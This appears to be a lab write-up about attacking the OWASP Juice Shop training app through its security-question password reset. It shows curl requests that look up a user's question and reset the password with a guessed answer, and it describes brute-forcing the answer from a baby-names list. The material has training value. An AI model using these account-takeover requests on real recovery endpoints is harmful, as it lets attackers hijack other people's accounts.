the juice shop challenges didn't include an insecure design category. 

however, it is noteworthy that the juice shop website provides an questions and answer credential recovery workflow and this is something we can leverage  https://juice.8-thousander.me/#/forgot-password

First off, i tried browsing the website for email addresses to test. Then, I try them out one by one from the forgot password UI. 

```
curl 'https://juice.8-thousander.me/rest/user/security-question?email=jim@juice-sh.op' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6' \
  -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=l9wv5QOenYWKdj5twUlTKFNfJSkHgibLf2VFDmhEbu9NHNbAVXD8kmZ6aR3N' \
  -H 'dnt: 1' \
  -H 'if-none-match: W/"92-mlPLZ5oDzMmPp1y/TqY+KRpYUqc"' \
  -H 'referer: https://juice.8-thousander.me/' \
  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
  --compressed
```

I found that this particular uses his siblings middle name as answer. 

```
{"question":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2023-03-22T14:41:53.673Z","updatedAt":"2023-03-22T14:41:53.673Z"}}
```

Since name is easy to guess. I decide to bruteforce it. 

I used a baby names list gather from github as source https://raw.githubusercontent.com/aruljohn/popular-baby-names/master/2021/girl_boy_names_2021.json


this is the request I will use to brute force the forgot password api. 
```
curl 'https://juice.8-thousander.me/rest/user/reset-password' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6' \
  -H 'content-type: application/json' \
  -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=l9wv5QOenYWKdj5twUlTKFNfJSkHgibLf2VFDmhEbu9NHNbAVXD8kmZ6aR3N' \
  -H 'dnt: 1' \
  -H 'origin: https://juice.8-thousander.me' \
  -H 'referer: https://juice.8-thousander.me/' \
  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
  --data-raw '{"email":"jim@juice-sh.op","answer":"alex","new":"abc123","repeat":"abc123"}' \
  --compressed
```

I successfully updated the password for user "jim@juice-sh.op". 

```
{"user":{"id":2,"username":"","email":"jim@juice-sh.op","password":"e99a18c428cb38d5f260853678922e03","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2023-03-22T14:41:54.073Z","updatedAt":"2023-03-23T04:39:42.574Z","deletedAt":null}}Samuel
```

